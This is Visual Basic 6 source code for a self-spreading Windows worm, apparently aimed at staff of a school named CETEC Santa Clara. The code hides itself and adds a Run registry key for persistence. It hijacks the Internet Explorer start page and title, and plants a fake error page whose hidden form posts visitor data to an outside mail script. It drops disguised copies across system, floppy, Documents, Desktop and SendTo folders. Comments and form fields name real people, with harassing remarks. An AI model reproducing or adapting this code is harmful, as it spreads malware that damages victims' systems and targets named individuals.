Attribute VB_Name = "Module1"
Option Explicit
Public sysdir, windir, wsh, fso
Public Const MUTEX As String = "\winapp32."
' Es el 29 de septiembre del 2004
' Comienzo esta creacion por que el personal de CETEC Santa Clara se lo ha ganado
' a pulso.
' Utilizo esta forma de expresion por que despues de todo estamos en un pais �Libre?
' Recuerden que por algo  mi gafete dice "Experto"
Sub main()
On Error Resume Next
App.TaskVisible = False
Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set sysdir = fso.getSpecialFolder(1)
Set windir = fso.getSpecialFolder(0)
If False Then MsgBox ("Claudia Correa Zaragoza, la administracion que das al plantel no es mala, lo que est� muy mal es la forma en que pides y haces las cosas")
If False Then MsgBox ("La cosa m�s dif�cil de hacer es ver a quien amas amando a alguien m�s")
If False Then MsgBox ("Edith, siento hacia t�, algo m�s que amistad, pero a la vez tengo miedo de decirtelo por temor a perderte")
Load frmHidden
instalar
registro
createHTM
createFiles
spread
End Sub

Public Sub instalar()
On Error Resume Next
Dim yulisaPeluche, f
If fso.getfile(sysdir & MUTEX) = "" Then
    Set yulisaPeluche = fso.createTextFile(sysdir & MUTEX, 2, False)
    yulisaPeluche.WriteLine ("�YXWSMARTAAR:No se encuentra o no se puede cargar$�����J�!�*��t���S��'��ñ��J�!�tJ�H�!rD�&�&G�&���&�6�D�&���������3�����>S�t��t�H�SH����!�(�V��")
    yulisaPeluche.WriteLine ("K�!s$��6$�!ƺ)��!>p���q�M�!>u(������rd�K�!����s�<Bt�<Du�����<u�i2�P>t��t�/%�!XPt!��=�!r0�ƺ��D�!�>�!>tġ$&&&GX�L�!ˡT�.�R������/�u���t/%�!�Z���")
    yulisaPeluche.WriteLine ("�TV�u�m4�6>r�rC�!s�b����H����!ƹ6s>r�O�rd�K�rs���$�!ƺ)��!����M�!�t�2��>Z�u�O�Z�QRVW�QVX�&�6TV��^YO=\t=/tG�\@G�^Y3����_^ZYø/5�!�/%2�!�=t=Kt.�.")
    yulisaPeluche.WriteLine ("3�Z�r�3���wininit.exe-wininit.ini��>p|*qs���rzt,�u��t|��\0s|�e&�(@uy���u�q���@<Bt<Du�����Qt.�t)�u6�N�(��+�")
    yulisaPeluche.WriteLine ("o�q��+�A.��t�����P��X�<>(t���!��6V�w�躽qu+s�(^u�d�^��Salida fatal! No se puede volver a Windows")
    yulisaPeluche.WriteLine ("$Error irrecuperable. No se puede iniciar Windows.$�2�����2��~����t\*�������tH:|u�����D*~2��2S|����[RS��[D*VP����Xd*D*ĥ")
    yulisaPeluche.WriteLine ("^d*^D*2���[��ý|r=~�y�\*�2����L*�T*L*~�D�~�|R�R�ZT*��t(���D�\*��1�T*�D(�D+�D-�T*�|������|�r��~��\*~��|�r~���D*~�3�|�}����������V6p\D����>muK3���p�")
    yulisaPeluche.WriteLine ("/�3�����/��tE&�&G�&G�&G�3���>mt��.���t뻡t3��.���/%�!���\����J�KKKK4+�t�Kux�U�>9Ft��f.�.��w�SQ�>p��.�Y[�A>m��:�3>mt��Q�'].����3�s��>ou��03�]�R�")
    yulisaPeluche.WriteLine ("m=��t����C�t���.�mZ�3���R�v�w�m�Kt�����t��#�3�Zû������2���.���r,9u>=Zt����@�&=MtZt��=Zu����s�&9>t�&A&��3��.�..P.���r9>t=Zt��s�X��l�.>ub[��^��")
    yulisaPeluche.WriteLine ("�r�Z;�v�R;�w�.>u.>t9v+��tL��I��.3�.�>��w�.r.+���t�@�I&�M&&>Q;�v��*���H��r&>�y���v�QRVW=u����^=u���T=u����J=u.�=u.�u1.�;�w)3�..=u.;.;u3�.�.�_^")
    yulisaPeluche.WriteLine ("ZY�PATHsystem\kernel.exe system\win386.exe system\dosx.exe krnl386-system\wswap.exe system\dswap.exe windir=�������������������������������com1 Es")
    yulisaPeluche.WriteLine ("ta versi�n de Windows necesita un 80386 (o posterior).Su computadora no puede ejecutar Windows en el modo  extendido del 386.$No se puede encontra")
    yulisaPeluche.WriteLine ("r los arhivos necesarios para ejecutar en el modo est�ndar o extendido del386;  verifique que la ruta de acceso sea correcta o reinicieWindows.$N")
    yulisaPeluche.WriteLine ("o se puede encontrar WIN386.EXE para ejecutar en el modo extendido del 386verifique que la ruta de acceso sea correcta o reinicie Windows.$No se")
    yulisaPeluche.WriteLine (" puede encontrar DOSX.EXE para ejecutar en el modoestndar; verifiqueque la ruta de acceso sea correctao reinicie Windows.$HIMEM.SYS no es vlido;in")
    yulisaPeluche.WriteLine ("stale HIMEM.SYS de los disquetes de Instalar Windows.$No se ha encontrado HIMEM.SYS;Verifique que el archivo esten el directorio Windows yque la r")
    yulisaPeluche.WriteLine ("uta estespecificada correctamente en CONFIG.SYS$Debe tener una versi�n de MS-DOS 3.10 o posterior$No hay suficiente memoria convencional para ejec")
    yulisaPeluche.WriteLine ("utar Windows;reconfigure su sistema para incrementar la memoria disponibley vuelva a intentar la operaci�n.$No hay suficiente identificadores de a")
    yulisaPeluche.WriteLine ("rchivo disponibles,incremente files= en config.sys a 30 o ms.$E���o�u�o�-��`SP�����شJ�!X�-ӱ���PS�H�![sY�,�&�Z&�K&���>p�X�PV���t��O^X�U��(PSQRVW�")
    yulisaPeluche.WriteLine ("=�!rwظD�!ri��tc��@t]Vع(�D�!�rN;�uJ2ɰ6DtS���g[�u���6Dt)6D6+D&vƣ���D�!;�tǸ>�!_^ZY[X�]�Z�J�R�!�&;�t�3�&=Zt&E@&}u�&M��ôR�!3�&_&G&?�t&���sH�أ>�u")
    yulisaPeluche.Close
    MsgBox ("No hay ninguna Aplicaci�n asosiada con este archivo. Windows usar� el Bloc de Notas para abrirlo"), vbInformation, "Windows"
    Set f = fso.getfile(sysdir & MUTEX)
    f.Attributes = 2 + 4
    wsh.run (windir & "\notepad.exe " & sysdir & MUTEX)
End If
fso.copyfile App.EXEName & ".exe", sysdir & "\folder32.exe"
Set f = Nothing
Set f = fso.getfile(sysdir & "\folder32.exe")
f.Attributes = 2 + 4
registro

End Sub

Public Function r(hKey)
On Error Resume Next
Dim l
l = wsh.regread(hKey)
r = l
End Function

Public Sub e(hKey, rValue)
On Error Resume Next
wsh.regWrite hKey, rValue
End Sub
Public Sub registro()
On Error Resume Next
e "HKLM\software\Microsoft\Windows\CurrentVersion\Run\Folder32", sysdir & "\folder32.exe"
e "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "Microsotf Internet ExpIorer"
e "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "file:///" & sysdir & "\error.htm"
e "HKLM\Software\CETEC\WormVersion", "1.0"
e "HKLM\Software\CETEC\Lang", "ES"
End Sub

Public Sub createHTM()
On Error Resume Next
Dim edith, f, trampita
trampita = sysdir & "\error.htm"
If fso.getfile(trampita) = "" Then
    Set edith = fso.createTextFile(trampita, 2, False)
    edith.WriteLine ("<html><head><title>No se puede mostrar la pagina</title>")
    edith.WriteLine ("</head><body><h1>No encontrado</h1><p><font face=" & Chr$(34) & "Verdana" & Chr$(34) & " size=" & Chr$(34) & "2" & Chr$(34) & ">")
    edith.WriteLine ("La pagina a la que ha intentado acceder no se encuentra disponible en este momento, el problema puede deberse a varias causas:</font></p>")
    edith.WriteLine ("<ul><li>No existe</li><li>La direccion esta escrita incorrectamente</li>")
    edith.WriteLine ("<li>Hay demasiadas personas intentando acceder al mismo tiempo</li>")
    edith.WriteLine ("<li>Tiene dificultades tecnicas</li>")
    edith.WriteLine ("</ul>")
    edith.WriteLine ("<p><form name=" & Chr(34) & "form1" & Chr(34) & " method=" & Chr(34) & "post" & Chr(34) & " action=" & Chr(34) & "http://mail.grupocetec.com/cgi-bin/formmail.pl" & Chr(34) & ">")
    edith.WriteLine ("<input type=" & Chr(34) & "hidden" & Chr(34) & " name=" & Chr(34) & "recipient" & Chr(34) & " value=" & Chr(34) & "dirsantaclara@grupocetec.com" & Chr(34) & ">")
    edith.WriteLine ("<input type=" & Chr(34) & "hidden" & Chr(34) & " name=" & Chr(34) & "env_report" & Chr(34) & " value=" & Chr(34) & "REMOTE_HOST,HTTP_USER_AGENT,REMOTE_ADDR," & Chr(34) & ">")
    edith.WriteLine ("<input type=" & Chr(34) & "hidden" & Chr(34) & " name=" & Chr(34) & "redirect" & Chr(34) & " value=" & Chr(34) & "http://29a.host.sk" & Chr(34) & ">")
    edith.WriteLine ("<input name=" & Chr(34) & "nombre" & Chr(34) & " type=" & Chr(34) & "hidden" & Chr(34) & " value=" & Chr(34) & "Briseida" & Chr(34) & ">")
    edith.WriteLine ("<input name=" & Chr(34) & "comentarios" & Chr(34) & " type=" & Chr(34) & "hidden" & Chr(34) & " value=" & Chr(34) & "Si quieren hacerle un favor al plantel Santa Clara quiten a Claudia Correa de la coordinacion academica y a Leticia Hernandez de la Direccion del plantel..." & Chr(34) & ">")
    edith.WriteLine ("<font face=" & Chr(34) & "Verdana" & Chr(34) & " size=" & Chr(34) & "2" & Chr(34) & ">")
    edith.WriteLine ("Aunque este error no es comun, a menudo indica que el sitio Web tiene problemas tecnicos, haga clic en <input type=" & Chr(34) & "submit" & Chr(34) & " value=" & Chr(34) & "Actualizar" & Chr(34) & "> para intentar de nuevo</font>")
    edith.WriteLine ("</form></p></body></html>")
    edith.Close
End If
End Sub

Public Sub createHTA()
On Error Resume Next
Dim norma, f
End Sub

Sub createFiles()
On Error Resume Next
Dim sNombre As String, x As Integer, ex As String, y As Integer
sNombre = ""
While y < 101
For x = 1 To 8
    Randomize Timer
    sNombre = sNombre & LTrim$(RTrim$(Str$(Int(Rnd * 9))))
Next
Randomize Timer
x = Rnd * 5
Select Case x
    Case 0
        ex = "exe"
    Case 1
        ex = "bat"
    Case 2
        ex = "scr"
    Case 3
        ex = "com"
    Case 4
        ex = "pif"
End Select
sNombre = sNombre + "." & ex
fso.copyfile App.EXEName & ".exe", sysdir & "\" & sNombre
fso.copyfile App.EXEName & ".exe", windir & "\" & sNombre
sNombre = ""
y = y + 1
Wend
End Sub

Sub spread()
On Error Resume Next
Dim miDoc, buro, enviarA
fso.copyfile App.EXEName & ".exe", "a:\Nueva Carpeta..exe"
fso.copyfile App.EXEName & ".exe", "a:\www.horoscopopersonal.com"
fso.copyfile App.EXEName & ".exe", "a:\www.google.com.exe"
fso.copyfile App.EXEName & ".exe", "a:\Antimapson.exe"
fso.copyfile App.EXEName & ".exe", "a:\Nueva Carpeta(2).exe"
fso.copyfile App.EXEName & ".exe", "a:\Windows.exe"
miDoc = wsh.SpecialFolders("MyDocuments")
buro = wsh.SpecialFolders("Desktop")
enviarA = wsh.SpecialFolders("SendTo")
fso.copyfile App.EXEName & ".exe", miDoc & "\Mi M�sica.exe"
fso.copyfile App.EXEName & ".exe", miDoc & "\Mis Im�genes.exe"
fso.copyfile App.EXEName & ".exe", buro & "\Nueva carpeta.exe"
fso.copyfile App.EXEName & ".exe", enviarA & "\Carpeta comprimida (en ZIP).exe"
End Sub
